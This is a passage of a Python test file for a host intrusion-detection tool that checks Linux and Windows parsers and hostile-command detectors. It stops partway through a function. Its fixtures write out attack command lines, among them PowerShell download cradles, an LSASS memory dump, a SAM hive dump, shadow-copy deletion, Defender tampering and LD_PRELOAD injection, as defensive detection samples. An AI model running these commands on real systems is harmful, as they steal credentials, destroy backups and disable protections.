"""Cross-platform coverage: the Linux and Windows code paths.

The Linux sensors are additionally proven live (real /proc, real systemd units,
real ELF drops, real listeners) inside a container — see BATTLE-LOG.md. This
file is the always-on regression net that runs everywhere.

It is NOT the primary evidence for Windows, and believing that it was is how two
Windows sensors stayed broken for an entire release. The fixtures here are real
command-output shapes (`schtasks /query /fo csv /v`, `netstat -ano`,
`Get-MpComputerStatus`, `Get-WinEvent`), so the parsers are tested against what
Windows actually prints — but a fixture only ever proves the half of the system
that consumes it. The Winlogon registry path was wrong and the fake-registry
fixture was built from the same wrong constant; the process query emitted a
literal `` `t `` and the fixtures here fed the parser real tabs it never had to
produce. Both passed here and returned nothing on a real machine.

The primary Windows evidence is tests/win_live_harness.py, which runs against a
real Windows kernel on every CI push. When adding coverage for a Windows path
that TALKS TO the OS (a registry key, a command's real output shape, a
signature verdict), add it there, not only here.

Platform-selected constants are exercised by patching the module's platform
flags where a pure function reads them.
"""
import os
import shutil
import sys
import tempfile
import unittest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import aegis  # noqa: E402


class PlatformFlags(unittest.TestCase):
    def test_exactly_one_platform_is_active(self):
        self.assertEqual(1, sum((aegis.IS_MAC, aegis.IS_WIN, aegis.IS_LINUX)))

    def test_platform_name_matches_flags(self):
        expected = ("mac" if aegis.IS_MAC else
                    "windows" if aegis.IS_WIN else "linux")
        self.assertEqual(aegis.PLATFORM, expected)

    def test_core_path_tables_are_populated(self):
        # An empty table on some platform would silently disable a whole sensor.
        for name in ("PERSISTENCE_DIRS", "HOT_DIRS", "STAGING_DIRS",
                     "TRUSTED_PREFIXES", "RISKY_PREFIXES", "SHELL_RC_FILES",
                     "SHELL_HISTORY_FILES", "BROWSER_EXT_ROOTS"):
            self.assertTrue(getattr(aegis, name),
                            "%s is empty on %s" % (name, aegis.PLATFORM))

    def test_no_empty_string_prefix_would_match_everything(self):
        # "" as a prefix makes is_risky_location()/trust checks match any path.
        for name in ("TRUSTED_PREFIXES", "RISKY_PREFIXES", "_TEMP_DROP_DIRS"):
            self.assertNotIn("", getattr(aegis, name))


# --------------------------------------------------------------------------- #
# systemd / XDG parsers (Linux persistence)
# --------------------------------------------------------------------------- #
class SystemdUnitParser(unittest.TestCase):
    def test_execstart_and_ld_preload_are_extracted(self):
        unit = ("[Unit]\nDescription=x\n\n[Service]\nType=simple\n"
                "ExecStart=/bin/bash /tmp/payload.sh --daemon\n"
                "Environment=LD_PRELOAD=/tmp/evil.so\n\n"
                "[Install]\nWantedBy=default.target\n")
        execs, env, boot = aegis._parse_systemd_unit(unit)
        self.assertEqual([["/bin/bash", "/tmp/payload.sh", "--daemon"]], execs)
        self.assertEqual({"LD_PRELOAD": "/tmp/evil.so"}, env)
        self.assertTrue(boot)

    def test_systemd_exec_prefixes_are_stripped(self):
        # systemd allows @ - : ! + prefixes on the executable; the real program
        # is what follows, and a parser that keeps them resolves nothing.
        execs, _env, _b = aegis._parse_systemd_unit(
            "[Service]\nExecStart=-/usr/bin/curl http://x/y\n")
        self.assertEqual([["/usr/bin/curl", "http://x/y"]], execs)

    def test_empty_execstart_reset_line_executes_nothing(self):
        execs, _env, _b = aegis._parse_systemd_unit(
            "[Service]\nExecStart=\nExecStart=/bin/true\n")
        self.assertEqual([["/bin/true"]], execs)

    def test_comments_and_malformed_lines_never_raise(self):
        execs, env, _b = aegis._parse_systemd_unit(
            "# comment\n; also comment\ngarbage-no-equals\n"
            "[Service]\nExecStart=/bin/true\n")
        self.assertEqual([["/bin/true"]], execs)
        self.assertEqual({}, env)

    def test_non_ld_environment_keys_are_ignored(self):
        _e, env, _b = aegis._parse_systemd_unit(
            "[Service]\nEnvironment=PATH=/usr/bin LANG=C\nExecStart=/bin/true\n")
        self.assertEqual({}, env)


class DesktopEntryParser(unittest.TestCase):
    def test_exec_field_codes_stripped_and_hidden_detected(self):
        argv, hidden = aegis._parse_desktop_entry(
            "[Desktop Entry]\nType=Application\nExec=/tmp/p.sh --run %U %f\n"
            "Hidden=true\n")
        self.assertEqual(["/tmp/p.sh", "--run"], argv)
        self.assertTrue(hidden)

    def test_other_groups_are_ignored(self):
        argv, _h = aegis._parse_desktop_entry(
            "[Desktop Action New]\nExec=/bin/decoy\n"
            "[Desktop Entry]\nExec=/bin/real\n")
        self.assertEqual(["/bin/real"], argv)


# --------------------------------------------------------------------------- #
# /proc network parsers (Linux listeners + outbound)
# --------------------------------------------------------------------------- #
class ProcNetParser(unittest.TestCase):
    LISTEN = (
        "  sl  local_address rem_address   st tx_queue rx_queue tr tm->when "
        "retrnsmt   uid  timeout inode\n"
        "   0: 00000000:1F90 00000000:0000 0A 00000000:00000000 00:00000000 "
        "00000000  1000        0 45678 1 0000 100 0\n"
        "   1: 0100007F:1538 00000000:0000 0A 00000000:00000000 00:00000000 "
        "00000000  1000        0 45679 1 0000 100 0\n")

    def test_wildcard_listener_kept_loopback_dropped(self):
        # (port, uid, inode) — the uid is read because it is available without
        # root even when the owning pid is not, keeping an unattributable
        # listener actionable.
        rows = aegis._parse_proc_net_tcp(self.LISTEN)
        self.assertEqual([("8080", "1000", "45678")], rows)

    def test_established_rows_are_ignored_by_listen_parser(self):
        est = self.LISTEN.replace(" 0A ", " 01 ")
        self.assertEqual([], aegis._parse_proc_net_tcp(est))

    def test_ipv4_hex_address_decodes_little_endian(self):
        self.assertEqual("93.184.216.34",
                         aegis._decode_proc_hex_addr("22D8B85D"))

    def test_ipv6_hex_address_decodes(self):
        # 2001:db8::1
        got = aegis._decode_proc_hex_addr(
            "B80D0120" + "00000000" + "00000000" + "01000000")
        self.assertEqual("2001:db8::1", got)

    def test_established_outbound_parsed_and_loopback_dropped(self):
        text = (
            "  sl  local_address rem_address st ...\n"
            "   0: 0100007F:8B1A 22D8B85D:01BB 01 00000000:00000000 00:0 0 "
            "1000 0 99001 1 0 100 0\n"
            "   1: 0100007F:8B1B 0100007F:1F90 01 00000000:00000000 00:0 0 "
            "1000 0 99002 1 0 100 0\n")
        rows = aegis._parse_proc_net_tcp_established(text)
        self.assertEqual([("93.184.216.34", "443", "99001")], rows)

    def test_malformed_rows_never_raise(self):
        self.assertEqual([], aegis._parse_proc_net_tcp("garbage\nx y z\n"))
        self.assertEqual([], aegis._parse_proc_net_tcp_established("\n\n"))


# --------------------------------------------------------------------------- #
# Linux auth-log parser
# --------------------------------------------------------------------------- #
class AuthLogParser(unittest.TestCase):
    def test_brute_force_needs_a_burst_not_one_typo(self):
        one = ("Aug  3 10:00:01 h sshd[9]: Failed password for invalid user "
               "admin from 203.0.113.9 port 5000 ssh2\n")
        _hits, brute = aegis._parse_auth_log(one)
        self.assertEqual({}, brute, "a single failure must not alert")
        _hits, brute = aegis._parse_auth_log(one * aegis._AUTH_FAIL_THRESHOLD)
        self.assertEqual({("admin", "203.0.113.9"): aegis._AUTH_FAIL_THRESHOLD},
                         brute)

    def test_new_account_and_privileged_group_add_are_high(self):
        hits, _b = aegis._parse_auth_log(
            "Aug  3 10:20:01 h useradd[1]: new user: name=backdoor, UID=0\n"
            "Aug  3 10:21:01 h usermod[2]: usermod -G sudo backdoor\n")
        names = {n: sev for n, sev, _d, _l in hits}
        self.assertEqual("HIGH", names.get("new-user-account"))
        self.assertEqual("HIGH", names.get("privileged-group-add"))

    def test_root_ssh_login_flagged(self):
        hits, _b = aegis._parse_auth_log(
            "Aug 3 10:00:01 h sshd[9]: Accepted password for root from "
            "203.0.113.9 port 22 ssh2\n")
        self.assertIn("root-ssh-login", {n for n, _s, _d, _l in hits})

    def test_ordinary_log_traffic_is_silent(self):
        hits, brute = aegis._parse_auth_log(
            "Aug  3 10:00:01 h CRON[1]: pam_unix(cron:session): session opened "
            "for user root by (uid=0)\n"
            "Aug  3 10:00:02 h systemd-logind[2]: New session 3 of user alice.\n")
        self.assertEqual([], hits)
        self.assertEqual({}, brute)


# --------------------------------------------------------------------------- #
# Windows: scheduled tasks
# --------------------------------------------------------------------------- #
class SchtasksCsvParser(unittest.TestCase):
    REAL = (
        '"HostName","TaskName","Next Run Time","Status","Task To Run","Comment"\n'
        '"DESKTOP-1","\\UpdaterTask","8/3/2026 4:00:00 PM","Ready",'
        '"C:\\Users\\a\\AppData\\Roaming\\upd.exe -silent","N/A"\n'
        '"DESKTOP-1","\\Microsoft\\Windows\\Defrag\\ScheduledDefrag",'
        '"8/4/2026 1:00:00 AM","Ready","%windir%\\system32\\defrag.exe -c","N/A"\n'
        '"DESKTOP-1","\\ComTask","N/A","Ready","COM handler","N/A"\n')

    def test_user_task_extracted_and_microsoft_tree_skipped(self):
        rows = aegis._parse_schtasks_csv(self.REAL)
        self.assertEqual(
            [("\\UpdaterTask",
              "C:\\Users\\a\\AppData\\Roaming\\upd.exe -silent")], rows)

    def test_com_handler_rows_are_skipped(self):
        # "COM handler" is not a command line; treating it as one would
        # fabricate a program path.
        for _name, cmd in aegis._parse_schtasks_csv(self.REAL):
            self.assertNotEqual("COM handler", cmd)

    def test_garbage_never_raises(self):
        self.assertEqual([], aegis._parse_schtasks_csv("not,a,valid\ncsv"))
        self.assertEqual([], aegis._parse_schtasks_csv(""))


class WindowsCommandLineSplit(unittest.TestCase):
    def test_quoted_path_with_spaces(self):
        self.assertEqual(
            ["C:\\Program Files\\App\\a.exe", "--run"],
            aegis._win_split_cmd('"C:\\Program Files\\App\\a.exe" --run'))

    def test_unquoted_path(self):
        self.assertEqual(["C:\\tmp\\a.exe", "-x"],
                         aegis._win_split_cmd("C:\\tmp\\a.exe -x"))

    def test_empty_input(self):
        self.assertIsNone(aegis._win_split_cmd(""))
        self.assertIsNone(aegis._win_split_cmd("   "))
        self.assertIsNone(aegis._win_split_cmd(None))

    def test_env_expansion_uses_real_environment(self):
        os.environ["AEGIS_TEST_VAR"] = "XYZ"
        try:
            self.assertEqual("a-XYZ-b",
                             aegis._expand_win_env("a-%AEGIS_TEST_VAR%-b"))
        finally:
            del os.environ["AEGIS_TEST_VAR"]


class WindowsNetstatParser(unittest.TestCase):
    REAL = (
        "\nActive Connections\n\n"
        "  Proto  Local Address          Foreign Address        State"
        "           PID\n"
        "  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING"
        "       1044\n"
        "  TCP    127.0.0.1:5432         0.0.0.0:0              LISTENING"
        "       3300\n"
        "  TCP    192.168.1.5:52344      93.184.216.34:443      ESTABLISHED"
        "     7788\n")

    def test_public_listener_kept_loopback_dropped(self):
        self.assertEqual([("135", "1044")],
                         aegis._parse_netstat_listen_windows(self.REAL))

    def test_established_rows_are_not_listeners(self):
        for port, _pid in aegis._parse_netstat_listen_windows(self.REAL):
            self.assertNotEqual("443", port)

    def test_header_and_blank_lines_never_raise(self):
        self.assertEqual([], aegis._parse_netstat_listen_windows(
            "\nActive Connections\n\n  Proto  Local Address\n"))


class WindowsPostureParser(unittest.TestCase):
    def test_parses_defender_firewall_and_bitlocker(self):
        d = aegis._parse_win_posture(
            "rtp=False\ntamper=False\nsigage=31\nexcl=C:\\tmp;C:\\Users\\a\n"
            "fw=Domain=True\nfw=Private=False\nfw=Public=True\n"
            "bitlocker=Off\n")
        self.assertEqual("False", d["rtp"])
        self.assertEqual("31", d["sigage"])
        self.assertEqual([("Domain", True), ("Private", False),
                          ("Public", True)], d["fw"])
        self.assertEqual("Off", d["bitlocker"])

    def test_unknown_markers_survive(self):
        d = aegis._parse_win_posture("rtp=?\nfw=?\nbitlocker=?\n")
        self.assertEqual("?", d["rtp"])
        self.assertEqual([], d["fw"])


class WindowsHardeningScoring(unittest.TestCase):
    """_check_hardening_windows against captured posture output. The sensor is
    invoked directly with `run` stubbed, so the scoring runs on any host."""

    def _score(self, posture_text, rc=0):
        saved = aegis.run
        aegis.run = lambda cmd, timeout=15, extra_env=None: (posture_text, "", rc)
        try:
            return aegis._check_hardening_windows()
        finally:
            aegis.run = saved

    def test_defender_disabled_is_critical(self):
        fs = self._score("rtp=False\ntamper=True\nsigage=1\nexcl=\n"
                         "fw=Domain=True\nbitlocker=On\n")
        sev = {f["title"]: f["severity"] for f in fs}
        self.assertEqual(
            "CRITICAL",
            sev.get("Microsoft Defender real-time protection is OFF"))

    def test_healthy_posture_produces_no_findings(self):
        fs = self._score("rtp=True\ntamper=True\nsigage=1\nexcl=\n"
                         "fw=Domain=True\nfw=Private=True\nfw=Public=True\n"
                         "bitlocker=On\n")
        self.assertEqual([], fs, "a healthy Windows box must be silent")

    def test_exclusions_and_stale_signatures_surface(self):
        fs = self._score("rtp=True\ntamper=True\nsigage=40\n"
                         "excl=C:\\Users\\a\\AppData\n"
                         "fw=Domain=True\nbitlocker=On\n")
        titles = {f["title"] for f in fs}
        self.assertIn("Defender scan exclusions are configured", titles)
        self.assertIn("Defender signatures are stale", titles)

    def test_probe_failure_is_unknown_not_clean(self):
        fs = self._score("", rc=1)
        self.assertTrue(any(f["category"] == "coverage" for f in fs),
                        "an unreadable probe must degrade, never report clean")


class WindowsEventLogParser(unittest.TestCase):
    def test_parses_pipe_delimited_rows(self):
        rows = aegis._parse_win_events(
            "Security|4720|2026-08-03T10:00:00|A user account was created.\n"
            "Microsoft-Windows-PowerShell/Operational|4104|2026-08-03T10:01:00"
            "|Creating Scriptblock text: IEX (New-Object Net.WebClient)"
            ".DownloadString('http://x/y')\n")
        self.assertEqual(2, len(rows))
        self.assertEqual("4720", rows[0][1])

    def test_non_numeric_ids_are_dropped(self):
        self.assertEqual([], aegis._parse_win_events("Security|abc|t|m\n"))

    def test_script_block_with_hostile_content_scores(self):
        # 4104 fires constantly on a dev box, so only hostile blocks may alert.
        hostile = aegis._hostile_content(
            "IEX (New-Object Net.WebClient).DownloadString('http://x/y')")
        self.assertIn("powershell-iex", hostile)
        self.assertIn("powershell-webclient-download", hostile)
        benign = aegis._hostile_content("Get-ChildItem C:\\Users | Sort-Object")
        self.assertEqual([], benign, "ordinary PowerShell must not match")


# --------------------------------------------------------------------------- #
# Cross-platform hostile-idiom scoring
# --------------------------------------------------------------------------- #
class WindowsHostileIdioms(unittest.TestCase):
    def _sev(self, argv, name):
        return dict(aegis._argv_signals(argv)).get(name)

    def test_encoded_powershell_command_is_high(self):
        argv = ("powershell.exe -nop -w hidden -enc "
                "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBi"
                "AEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcA")
        self.assertEqual("HIGH",
                         self._sev(argv, "powershell-encoded-command"))

    def test_lsass_dump_is_high(self):
        self.assertEqual(
            "HIGH",
            self._sev("rundll32.exe C:\\windows\\System32\\comsvcs.dll, "
                      "MiniDump 780 C:\\temp\\lsass.dmp full", "lsass-dump"))

    def test_sam_hive_dump_is_high(self):
        self.assertEqual("HIGH",
                         self._sev("reg save HKLM\\SAM C:\\temp\\sam.hiv",
                                   "sam-hive-dump"))

    def test_shadow_copy_deletion_is_high(self):
        self.assertEqual(
            "HIGH", self._sev("vssadmin delete shadows /all /quiet",
                              "shadow-copy-deletion"))

    def test_defender_tamper_is_high(self):
        self.assertEqual(
            "HIGH",
            self._sev("Set-MpPreference -DisableRealtimeMonitoring $true",
                      "defender-tamper"))

    def test_lolbin_proxy_exec_is_high(self):
        self.assertEqual(
            "HIGH",
            self._sev("mshta.exe http://198.51.100.5/a.hta",
                      "windows-lolbin-proxy-exec"))
        self.assertEqual(
            "HIGH",
            self._sev("certutil.exe -urlcache -split -f http://x/y.exe z.exe",
                      "windows-lolbin-proxy-exec"))

    def test_powershell_download_cradle_combination_is_high(self):
        # fetch + exec sink = the fileless pipeline, same rule as curl|bash.
        sev = self._sev(
            "powershell -c \"IEX (New-Object Net.WebClient)"
            ".DownloadString('http://198.51.100.5/a.ps1')\"",
            "fileless-fetch-exec")
        self.assertEqual("HIGH", sev)

    def test_ordinary_windows_commands_do_not_alert(self):
        for benign in (
                "C:\\Windows\\explorer.exe",
                "powershell.exe -NoProfile -Command Get-Process",
                "cmd.exe /c dir C:\\Users",
                "msbuild.exe MyProject.sln /p:Configuration=Release"):
            sigs = [n for n, sev in aegis._argv_signals(benign)
                    if aegis.SEV_ORDER[sev] >= aegis.SEV_ORDER["HIGH"]]
            self.assertEqual([], sigs, "false positive on %r" % benign)


class LinuxHostileIdioms(unittest.TestCase):
    def _sev(self, argv, name):
        return dict(aegis._argv_signals(argv)).get(name)

    def test_ld_so_preload_write_is_high(self):
        self.assertEqual(
            "HIGH", self._sev("sh -c 'echo /tmp/e.so > /etc/ld.so.preload'",
                              "ld-so-preload-write"))

    def test_memfd_fileless_exec_is_high(self):
        self.assertEqual("HIGH",
                         self._sev("python3 -c 'os.memfd_create(\"x\")'",
                                   "memfd-fileless-exec"))

    def test_systemd_tmp_unit_is_high(self):
        self.assertEqual(
            "HIGH", self._sev("systemctl enable /tmp/evil.service",
                              "systemd-tmp-unit"))

    def test_ld_preload_injection_recorded(self):
        self.assertIsNotNone(
            self._sev("LD_PRELOAD=/tmp/e.so /usr/bin/id",
                      "ld-preload-injection"))

    def test_ordinary_linux_commands_do_not_alert(self):
        for benign in ("/usr/bin/python3 manage.py runserver",
                       "bash -c 'make -j4'",
                       "systemctl --user status myapp.service",
                       "/usr/lib/systemd/systemd --user"):
            sigs = [n for n, sev in aegis._argv_signals(benign)
                    if aegis.SEV_ORDER[sev] >= aegis.SEV_ORDER["HIGH"]]
            self.assertEqual([], sigs, "false positive on %r" % benign)


# --------------------------------------------------------------------------- #
# Windows surfaces: WMI subscriptions + Defender exclusions
# --------------------------------------------------------------------------- #
class WmiSubscriptionDiff(unittest.TestCase):
    def test_new_subscription_with_hostile_payload_is_critical(self):
        fs = aegis.diff_wmi_subscriptions(
            {}, {"consumer:Updater":
                 "powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABO"
                 "AGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA"})
        self.assertEqual(1, len(fs))
        self.assertEqual("CRITICAL", fs[0]["severity"])

    def test_new_benign_subscription_is_high_not_ignored(self):
        fs = aegis.diff_wmi_subscriptions(
            {}, {"filter:HealthCheck": "SELECT * FROM __InstanceModification"})
        self.assertEqual("HIGH", fs[0]["severity"])

    def test_unchanged_subscriptions_are_silent(self):
        snap = {"consumer:X": "cscript.exe healthcheck.vbs"}
        self.assertEqual([], aegis.diff_wmi_subscriptions(snap, snap))

    def test_in_place_payload_swap_is_reported(self):
        fs = aegis.diff_wmi_subscriptions(
            {"consumer:X": "cscript.exe ok.vbs"},
            {"consumer:X": "powershell -enc " + "A" * 60})
        self.assertEqual(1, len(fs))
        self.assertIn("CHANGED", fs[0]["title"])


class DefenderExclusionDiff(unittest.TestCase):
    def test_new_exclusion_is_high(self):
        fs = aegis.diff_win_exclusions({}, {"path=C:\\Users\\a\\AppData": "1"})
        self.assertEqual(1, len(fs))
        self.assertEqual("HIGH", fs[0]["severity"])

    def test_unchanged_exclusions_are_silent(self):
        snap = {"path=C:\\Dev": "1"}
        self.assertEqual([], aegis.diff_win_exclusions(snap, snap))


# --------------------------------------------------------------------------- #
# Linux surfaces: kernel modules + setuid binaries
# --------------------------------------------------------------------------- #
class KernelModuleDiff(unittest.TestCase):
    def test_new_module_is_high(self):
        fs = aegis.diff_kernel_modules({"ext4": "1"},
                                       {"ext4": "1", "rootkit": "16384"})
        self.assertEqual(1, len(fs))
        self.assertEqual("HIGH", fs[0]["severity"])
        self.assertEqual("rootkit", fs[0]["module"])

    def test_stable_module_set_is_silent(self):
        snap = {"ext4": "1", "usbcore": "2"}
        self.assertEqual([], aegis.diff_kernel_modules(snap, snap))


class SuidDiff(unittest.TestCase):
    def test_new_suid_in_system_path_is_high(self):
        fs = aegis.diff_suid({}, {"/usr/bin/newsuid": "4755:1234"})
        self.assertEqual("HIGH", fs[0]["severity"])

    def test_new_suid_in_tmp_is_critical(self):
        fs = aegis.diff_suid({}, {"/tmp/rootme": "4755:1234"})
        self.assertEqual("CRITICAL", fs[0]["severity"])

    def test_changed_suid_binary_is_high(self):
        fs = aegis.diff_suid({"/usr/bin/sudo": "4755:100"},
                             {"/usr/bin/sudo": "4755:999"})
        self.assertEqual(1, len(fs))
        self.assertIn("CHANGED", fs[0]["title"])

    def test_stable_suid_set_is_silent(self):
        snap = {"/usr/bin/sudo": "4755:100", "/usr/bin/passwd": "4755:200"}
        self.assertEqual([], aegis.diff_suid(snap, snap))


# --------------------------------------------------------------------------- #
# Signature/trust semantics per platform
# --------------------------------------------------------------------------- #
class TrustSemantics(unittest.TestCase):
    def test_broken_signature_is_suspicious_everywhere(self):
        self.assertTrue(aegis.suspicious_sig("broken"))

    def test_linux_unmanaged_is_not_treated_as_malicious(self):
        # Every locally-built binary is 'unmanaged'; alerting on that would
        # drown a developer in noise. Linux keys on structure instead.
        saved = aegis.IS_LINUX, aegis.IS_WIN
        aegis.IS_LINUX, aegis.IS_WIN = True, False
        try:
            self.assertFalse(aegis.suspicious_sig("unmanaged"))
            self.assertTrue(aegis.suspicious_sig("broken"))
        finally:
            aegis.IS_LINUX, aegis.IS_WIN = saved

    def test_windows_unsigned_is_suspicious(self):
        saved = aegis.IS_LINUX, aegis.IS_WIN
        aegis.IS_LINUX, aegis.IS_WIN = False, True
        try:
            self.assertTrue(aegis.suspicious_sig("unsigned"))
            self.assertFalse(aegis.suspicious_sig("os-signed"))
            self.assertFalse(aegis.suspicious_sig("signed-valid"))
        finally:
            aegis.IS_LINUX, aegis.IS_WIN = saved


class SkipListsHaveNoDeadEntries(unittest.TestCase):
    """conftest's skip lists must not rot in the direction it never argued.

    tests/conftest.py reasons carefully about ONE direction: a RENAMED class
    stops being skipped and "fails loudly on Linux/Windows -- a visible failure
    mode, never a silent loss of coverage." True, and the reverse is not: an
    entry naming a class or test that no longer exists is inert, and nothing
    anywhere notices. The lists then read as coverage decisions that were
    reviewed when they are just residue, which is precisely how a skip list
    grows until nobody trusts it.

    The same file gained a self-assert for exactly this class of rot ten lines
    above SUSPICIOUS_TRUST, so this closes the other half.
    """

    def test_every_skip_list_entry_still_names_something_real(self):
        import conftest
        here = os.path.dirname(os.path.abspath(__file__))
        classes, tests = set(), set()
        for name in sorted(os.listdir(here)):
            if not name.startswith("test_") or not name.endswith(".py"):
                continue
            with open(os.path.join(here, name), "r", encoding="utf-8") as fh:
                for line in fh:
                    stripped = line.lstrip()
                    if stripped.startswith("class "):
                        classes.add(stripped[6:].split("(")[0].split(":")[0].strip())
                    elif stripped.startswith("def test"):
                        tests.add(stripped[4:].split("(")[0].strip())
        dead_classes = sorted(conftest._MAC_ONLY_CLASSES - classes)
        dead_tests = sorted(conftest._POSIX_ONLY_TESTS - tests)
        self.assertEqual(
            (dead_classes, dead_tests), ([], []),
            "conftest skip-list entries name things that no longer exist. "
            "Delete them: an inert entry looks like a reviewed coverage "
            "decision and is not one.\n"
            "  _MAC_ONLY_CLASSES: %s\n  _POSIX_ONLY_TESTS: %s"
            % (dead_classes, dead_tests))


class NoTestHardCodesOneBodysTrustVocabulary(unittest.TestCase):
    """The source-level guard for the class that actually cost a CI cycle.

    `StubbedTrustQualifiesOnEveryBody` below asserts the conftest HELPER is
    right. It does not — and by construction cannot — assert that any test
    FILE uses it, because the helper is per-body-correct by design while the
    defect is a body-specific LITERAL. Reverting all four SUSPICIOUS_TRUST
    uses in test_outbound_subject.py to `"adhoc"` leaves this whole suite
    green on macOS, which is exactly the state that shipped 12 Windows
    failures on 2026-08-24.

    The only honest detector for "a fixture hard-codes one body's spelling"
    is a source scan, so this is one. It scans for verdicts only macOS's
    codesign can produce, used as a stubbed `trust` value, in a test that is
    NOT gated to macOS. Those words are meaningless on the other two bodies:
    `_authenticode_record` emits os-signed/signed-valid/unsigned/broken and
    `_classify_linux` emits os-managed/unmanaged, so a Windows or Linux run
    of such a fixture silently exercises a branch that can never be taken.

    Milliseconds on any body, and it catches the whole class rather than the
    one instance that happened to be found.
    """

    # Verdicts ONLY _classify_mac produces (aegis.py's classify_signature
    # docstring is the source): the suspicious one, and the trusted ones that
    # gate custody demotions.
    _MAC_ONLY_VERDICTS = ("adhoc", "apple", "app-store", "developer-id")

    # A stubbed trust value looks like one of these, which is what makes a
    # scan viable at all rather than a grep for a bare word in prose.
    # Both spellings a fixture actually uses. The keyword-default form was
    # missed on the first pass and cost a full CI cycle to find: tests/
    # test_custody.py's `_prec(..., trust="developer-id")` fed a macOS word to
    # every custody assertion in the file while its docstring called itself
    # "the shape every platform snapshot produces".
    _STUB_SHAPES = ('"trust": "%s"', "'trust': '%s'", '"trust", "%s"',
                    'trust="%s"', "trust='%s'")

    # RATCHET, not an exemption list. Found by this guard on 2026-08-24, all
    # pre-existing. Each of these builds a persistence record with a macOS-only
    # trusted verdict and is NOT gated to macOS, so on Windows and Linux it
    # exercises the untrusted branch of whatever it is asserting -- silently,
    # and today, on green CI.
    #
    # They are listed rather than mass-edited because the fix is a per-case
    # judgement with a real cost either way: moving a class into
    # _MAC_ONLY_CLASSES DELETES its Linux coverage (that file's own docstring
    # warns about exactly this), while switching the verdict changes what the
    # assertion means. Neither is a change to make in bulk on a branch whose
    # Windows legs just went green.
    #
    # The list may only SHRINK: an entry naming a class that no longer offends
    # fails this test, so a fixed case cannot quietly leave debt behind and a
    # renamed class cannot quietly keep an exemption.
    # The one place a body-specific word is the POINT: this module's own
    # PublisherStableIsReachableOnEveryBody names each body's vocabulary in a
    # table and flips the flags to match, so it is asserting the split rather
    # than accidentally depending on one side of it.
    _BY_DESIGN = frozenset((
        "test_cross_platform.py:PublisherStableIsReachableOnEveryBody",
    ))

    _KNOWN_UNTRIAGED = frozenset((
        # The two remaining entries stub "developer-id" specifically, and
        # PUBLISHER_TRUST is "apple" on macOS: swapping them would silently
        # change what a macOS assertion means (one of them is literally about
        # vendor impersonation), which is a worse bug than the one being fixed.
        # They need a per-case reading, not a mechanical rewrite.
        # Empty, and it must stay that way by shrinking rather than by
        # deletion: the stale-entry check above fails on any name left here
        # that no longer offends, so this list cannot quietly become an
        # exemption list. All nine original entries were resolved by
        # 2026-08-24 — seven mechanically, and the last two by mutation
        # testing that proved their "developer-id" default inert (only
        # TestHotDirAppBundle's was load-bearing, and that class is
        # macOS-gated).
    ))

    def test_no_ungated_test_stubs_a_macos_only_trust_verdict(self):
        import conftest
        here = os.path.dirname(os.path.abspath(__file__))
        offenders, seen_baseline = [], set()
        for name in sorted(os.listdir(here)):
            if not name.startswith("test_") or not name.endswith(".py"):
                continue
            path = os.path.join(here, name)
            with open(path, "r", encoding="utf-8") as fh:
                lines = fh.read().splitlines()
            cls = None
            for n, line in enumerate(lines, 1):
                stripped = line.lstrip()
                if stripped.startswith("class "):
                    cls = stripped[6:].split("(")[0].split(":")[0].strip()
                if stripped.startswith("#"):
                    continue
                for verdict in self._MAC_ONLY_VERDICTS:
                    if not any(shape % verdict in line
                               for shape in self._STUB_SHAPES):
                        continue
                    # Gated to macOS by class, or by the whole file being a
                    # macOS-only module -> the fixture is honest about itself.
                    if cls in conftest._MAC_ONLY_CLASSES:
                        continue
                    key = "%s:%s" % (name, cls)
                    if key in self._BY_DESIGN:
                        continue
                    seen_baseline.add(key)
                    if key in self._KNOWN_UNTRIAGED:
                        continue
                    offenders.append(
                        "%s:%d (class %s) stubs trust=%r"
                        % (name, n, cls, verdict))
        stale = sorted(self._KNOWN_UNTRIAGED - seen_baseline)
        self.assertEqual(
            stale, [],
            "_KNOWN_UNTRIAGED names entries that no longer offend. Delete "
            "them -- a ratchet that does not tighten is just an exemption "
            "list: %s" % (stale,))
        self.assertEqual(
            offenders, [],
            "These fixtures hard-code a macOS-only trust verdict but are not "
            "gated to macOS, so on Windows/Linux they exercise a branch that "
            "cannot be reached and assert nothing:\n  "
            + "\n  ".join(offenders)
            + "\n\nUse conftest.SUSPICIOUS_TRUST (or "
              "conftest.suspicious_trust_for) for a verdict that qualifies on "
              "the running body, or add the class to conftest._MAC_ONLY_CLASSES "
              "if its assertions really are macOS-specific.")


class StubbedTrustQualifiesOnEveryBody(unittest.TestCase):
    """The gate a stubbed trust verdict has to clear, simulated per body.

    `TrustSemantics` above already pinned that the vocabulary differs by body.
    What nothing checked was the consequence: a SENSOR whose test feeds it a
    stubbed verdict inherits that split, and if the test hard-codes one body's
    word the sensor mints zero findings on the others while every assertion
    still reads as platform-neutral.

    That is not hypothetical. On 2026-08-24 all 12 cases in
    tests/test_outbound_subject.py failed on both Windows legs -- `{"trust":
    "adhoc"}`, a codesign word with no Authenticode equivalent, so
    `suspicious_sig` rejected it, `_outbound_candidate_trust` returned None for
    every row, and each assertion failed as an unexplained `0 != 1`. macOS and
    Linux were green, so only a Windows runner could see it, and it cost 24
    minutes of CI to say so.

    These two cases cost milliseconds and catch the same class on any body:
    the first checks the conftest mirror against the real predicate, the second
    drives the sensor end-to-end through each simulated gate.
    """

    _BODIES = (("mac", False, False), ("win", True, False),
               ("linux", False, True))

    def test_the_conftest_mirror_matches_the_real_predicate(self):
        from conftest import suspicious_trust_for
        saved = aegis.IS_WIN, aegis.IS_LINUX
        try:
            for name, is_win, is_linux in self._BODIES:
                aegis.IS_WIN, aegis.IS_LINUX = is_win, is_linux
                verdict = suspicious_trust_for(is_win, is_linux)
                self.assertTrue(
                    aegis.suspicious_sig(verdict),
                    "%s: conftest offers %r, which suspicious_sig rejects "
                    "there" % (name, verdict))
        finally:
            aegis.IS_WIN, aegis.IS_LINUX = saved

    def test_the_outbound_sensor_mints_a_finding_on_every_body(self):
        from conftest import suspicious_trust_for
        path = "/Users/x/.vscode/extensions/some.ext-1.0.0/native/claude"
        saved_flags = aegis.IS_WIN, aegis.IS_LINUX
        saved_fns = {n: getattr(aegis, n) for n in (
